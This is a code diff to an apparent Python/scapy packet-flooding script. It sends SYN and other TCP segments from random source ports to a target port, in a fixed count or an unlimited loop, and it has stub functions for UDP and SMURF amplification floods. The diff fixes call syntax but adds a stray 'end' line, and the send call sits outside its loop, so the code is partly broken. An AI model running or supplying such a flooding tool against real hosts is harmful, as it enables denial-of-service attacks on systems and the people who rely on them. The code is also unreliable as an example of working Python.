@@ -28,21 +28,24 @@ def sendTCP(d, p):
     for x in range (0, len(flags)):
         a=IP(dst=d)/TCP(flags=flags[x], sport=RandShort(), dport=p)
     send(a, verbose=0) #transmit packet
+    end
 
 def sendUDP(d, p):
     #check whether flags or other options are necessary
+    return True
 
 def sendSMURF(d, p):
     #Pausing this one, as another active IP is required. Consider using the target's gateway and guessing it to be x.x.x.1'
+    return True
 
 if args['count'] == "X" or args['count'] == "x": # If the user entered an X or x into the count argument (wants unlimited SYN segments sent)
     while (1 == 1):
-        sendTCP(args['source'] int(args['port']))
+        sendTCP(args['source'], int(args['port']))
         i = i + 1
         print(str(i) + " Packet Sent")
 else: # executed if the user defined an amount of segments to send.
     while i < int(args['count']):
-        sendTCP(args['source'] int(args['port']))
+        sendTCP(args['source'], int(args['port']))
         i = i + 1
         print(str(i) + " Packet Sent")
 print("All packets successfully sent.")
